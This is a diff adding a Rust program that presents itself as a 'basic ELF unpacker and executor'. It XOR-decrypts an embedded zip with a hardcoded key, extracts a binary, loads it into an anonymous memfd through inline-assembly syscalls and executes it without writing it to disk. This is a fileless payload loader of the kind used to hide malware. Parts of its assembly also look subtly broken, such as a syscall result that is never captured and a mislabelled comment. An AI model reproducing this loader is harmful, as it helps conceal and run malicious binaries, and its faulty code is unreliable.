@@ -1,0 +1,69 @@
+#![feature(asm)]
+
+static memFdName: &'static str = "\0";
+static fdPath:    &'static str = "/proc/self/fd/3\0";
+
+use std::os::unix::io::FromRawFd;
+fn main() {
+    println!("LittleHelper - basic ELF unpacker and executor");
+
+    // file path passed in from Santa
+    let buf = include_bytes!("/home/user/rust-training/santa/out-enc.zip");
+
+    // key passed in from Santa
+    let enc_key = [20, 73, 32, 135, 168, 157, 147, 30, 246, 225, 174, 65, 122, 225, 231, 179, 67, 210, 91, 31, 214, 148, 19, 99, 34, 233, 190, 57, 204, 250, 100, 185, 127, 7, 139, 135, 166, 100, 217, 127, 58, 22, 204, 170, 183, 26, 165, 202, 173, 96, 214, 77, 124, 85, 151, 134, 154, 118, 7, 66, 193, 26, 77, 240];
+
+    // output buffer
+    let mut out = Vec::<u8>::with_capacity(buf.len());
+
+    println!("Decrypting...");
+    for n in 0..buf.len() {
+        println!("{:?} = {:?}", buf.get(n), buf.get(n).unwrap()^enc_key.get(n%64).unwrap());
+        out.push( buf.get(n).unwrap() ^ enc_key.get(n%64).unwrap() );
+    }
+
+    println!("Writing to out-dec.zip");
+    std::fs::write("./out-dec.zip", &out); // write to file
+
+    println!("Reading zip...");
+    let mut zipcur = zip::ZipArchive::new(std::io::Cursor::new(&out[..]));
+    let mut zipcur = zipcur.unwrap();
+    let mut zipf = zipcur.by_name("bin").unwrap();
+
+    println!("Got file: {:?}, size {:?}", zipf.name(), zipf.size() as usize);
+
+    println!("Creating memfd...");
+    unsafe {
+        let mut asm_ret:u64;
+        asm!(
+            "lea   rdi, [{}]",
+            "mov   rsi, 1",   // MFD_CLOEXEC
+            "mov   rax, 319", // SYS_MEMFD_CREATE
+            "syscall",
+            "mov   rax, {}",
+            sym memFdName,
+            out(reg) asm_ret,
+        );
+        if asm_ret == 0 {
+            panic!("failed");
+        } else {
+            println!("Got memfd {:?}", asm_ret);
+        }
+        let mut memfd = std::fs::File::from_raw_fd( asm_ret as i32 );
+        println!("Copying data to memfd...");
+        std::io::copy(&mut zipf, &mut memfd);
+
+        println!("Executing memfd...");
+        asm!(
+            "mov   rdi, {}", // MFD_CLOEXEC
+            "mov   rsi, 0",
+            "mov   rdx, 0",
+            "mov   r10, 0",
+            "mov   r8, 0",
+            "mov   r9, 0",
+            "mov   rax, 59", // SYS_execve
+            "syscall",
+            sym fdPath,
+        );
+    }
+}
